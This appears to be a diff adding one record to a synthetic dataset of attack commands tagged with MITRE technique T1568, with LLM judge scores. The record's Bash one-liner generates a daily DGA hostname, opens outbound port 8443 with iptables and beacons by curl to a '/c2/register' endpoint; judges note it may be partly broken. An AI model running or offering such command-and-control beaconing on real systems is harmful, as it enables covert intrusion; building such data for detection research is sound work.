@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"iota\"; FQDN=\"$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)\" | sha256sum | cut -c1-12).cdn-mirror.app\"; PORT=8443; IP=$(resolvectl query \"$FQDN\" | awk -v d=\"$FQDN\" '$0 ~ d\": \\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+\" {print $3; exit}'); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; [ -n \"$IP\" ] && curl -sSf --resolve \"${FQDN}:${PORT}:${IP}\" -H \"X-Rand: $RANDOM\" \"https://${FQDN}:${PORT}/c2/register?ts=$(date +%s)\"",
+  "explanation": "Queries systemd-resolved for a DGA hostname to obtain an A record and then establishes a registration call over port 8443 bound to that IP.",
+  "rationale_steps": [
+    "Compute DGA domain daily",
+    "Resolve via systemd-resolved",
+    "Permit egress to alternate TLS port",
+    "Perform C2 registration over curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-a62de898",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner has balanced quoting and parentheses, valid command separators, and proper flag usage across printf, sha256sum, cut, resolvectl, awk, iptables, and curl.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly implements a DGA-derived FQDN and attempts dynamic resolution plus a pinned TLS request, but the awk IPv4 regex uses \\d (invalid in awk ERE) likely yielding no IP and the iptables step requires root, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T06:26:56.318705Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper command separators (;, &&, |), valid flag usage for sha256sum, cut, awk, iptables, and curl, and correct variable expansion throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command authentically implements T1568 DGA behavior by seeding a daily-rotating SHA256-derived 12-character hostname under a plausible CDN domain, resolving it via systemd-resolved, dynamically adding an iptables egress rule, and beaconing to the resolved C2 endpoint over HTTPS/8443 with a randomized header and timestamp — all operationally coherent and realistic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:22:52.079299Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed Bash with correct variable substitutions, command nesting, subshells, and pipe chaining.",
+        "semantic_score": 3,
+        "semantic_justification": "The command captures the essence of T1568 (DGA and dynamic resolution), but contains two significant operational flaws: the 'awk' command incorrectly prints the third field ('--') instead of the second (the IP address) from standard 'resolvectl' output, and the 'iptables' command requires root privileges despite the 'None' privilege specification.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:23:02.483310Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
